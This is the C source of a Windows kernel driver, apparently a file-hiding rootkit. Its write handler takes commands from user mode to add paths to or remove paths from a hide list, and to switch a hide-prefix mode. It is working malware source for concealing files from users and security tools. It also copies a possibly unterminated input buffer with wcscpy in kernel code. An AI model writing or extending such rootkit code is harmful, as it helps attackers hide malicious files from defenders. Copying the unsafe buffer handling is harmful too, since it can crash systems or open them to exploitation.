#include "irp_major_functions.h"

/* IRP Functions. */

NTSTATUS Create_DeviceIo(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    return STATUS_SUCCESS;
}

NTSTATUS Close_DeviceIo(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    return STATUS_SUCCESS;
}

NTSTATUS Io_Unsupported(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    return STATUS_SUCCESS;
}

NTSTATUS Buffered_Write(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    // Initializing variables.
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION pIoStackIrp = NULL;
    PWCHAR pInBuffer = NULL;
    ULONG bufLength;

    pIoStackIrp = IoGetCurrentIrpStackLocation(Irp); // Set a pointer to the most recent IRP on the stack.
    if (pIoStackIrp)
    {
        pInBuffer = (PWCHAR)Irp->AssociatedIrp.SystemBuffer; // Pointer to the recived buffer written to our IO Device (May not be null-terminated).
        if (pInBuffer)
        {
            bufLength = pIoStackIrp->Parameters.Write.Length; // Saves the length of the buffer.

            // Recieved add path to list command (e.g. `add.\\Device\Harddisk2\Users\Desktop\file.txt`)
            if (bufLength > wcslen(ADD_CMD_PREFIX) * sizeof(WCHAR) && // Check if the length is atleast enough to contain the add prefix.
                !wcsncmp(pInBuffer, ADD_CMD_PREFIX, wcslen(ADD_CMD_PREFIX)) && // Check if the message starts with the add prefix.
                bufLength < MAX_PATH * sizeof(WCHAR) + wcslen(ADD_CMD_PREFIX) * sizeof(WCHAR)) // Check if the length is not over the max length.
            {
                // Create a path object.
                path_t path = {0};
                path.length = bufLength / sizeof(WCHAR) - wcslen(ADD_CMD_PREFIX); // The recieved size is double in size because it's in normal char length + the `add.` command. So this strips them.
                wcscpy(path.path, &pInBuffer[wcslen(ADD_CMD_PREFIX)]);
                ForceNullTerminationWide(path.path, path.length);

                // Try adding received path to the hide list.
                if (InsertToArray(&hidePathsArr, path))
                    DbgPrintEx(0, 0, "Added path to hide list: SZ:%u, STR:%S", path.length, path.path);
                else
                    DbgPrintEx(0, 0, "Failed to add path to hide list: SZ:%u, STR:%S", path.length, path.path);
            }
            // Recieved remove path from list command (e.g. `del.\\Device\Harddisk2\Users\Desktop\file.txt`)
            else if (bufLength > wcslen(REMOVE_CMD_PREFIX) * sizeof(WCHAR) && // Check if the length is atleast enough to contain the remove prefix.
                !wcsncmp(pInBuffer, REMOVE_CMD_PREFIX, wcslen(REMOVE_CMD_PREFIX)) && // Check if the message starts with the remove prefix.
                bufLength < MAX_PATH * sizeof(WCHAR) + wcslen(REMOVE_CMD_PREFIX) * sizeof(WCHAR)) // Check if the length is not over the max length.
            {
                // Create a path object.
                path_t path = {0};
                path.length = bufLength / sizeof(WCHAR) - wcslen(REMOVE_CMD_PREFIX); // The recieved size is double in size because it's in normal char length + the `del.` command. So this strips them.
                wcscpy(path.path, &pInBuffer[wcslen(REMOVE_CMD_PREFIX)]);
                ForceNullTerminationWide(path.path, path.length);

                // Try removing received path from the hide list.
                if (RemoveFromArray(&hidePathsArr, path))
                    DbgPrintEx(0, 0, "Removed path from hide list: SZ:%u, STR:%S", path.length, path.path);
                else
                    DbgPrintEx(0, 0, "Failed to remove path from hide list: SZ:%u, STR:%S", path.length, path.path);
            }
            else if (bufLength == wcslen(ENABLE_HIDE_PREFIX) * sizeof(WCHAR) && !wcsncmp(pInBuffer, ENABLE_HIDE_PREFIX, wcslen(ENABLE_HIDE_PREFIX)))
            {
                enableHidePrefix = TRUE;
                DbgPrintEx(0, 0, "Enabled hide prefix");
            }
            else if (bufLength == wcslen(DISABLE_HIDE_PREFIX) * sizeof(WCHAR) && !wcsncmp(pInBuffer, DISABLE_HIDE_PREFIX, wcslen(DISABLE_HIDE_PREFIX)))
            {
                enableHidePrefix = FALSE;
                DbgPrintEx(0, 0, "Disabled hide prefix");
            }
        }
    }

    return STATUS_SUCCESS;
}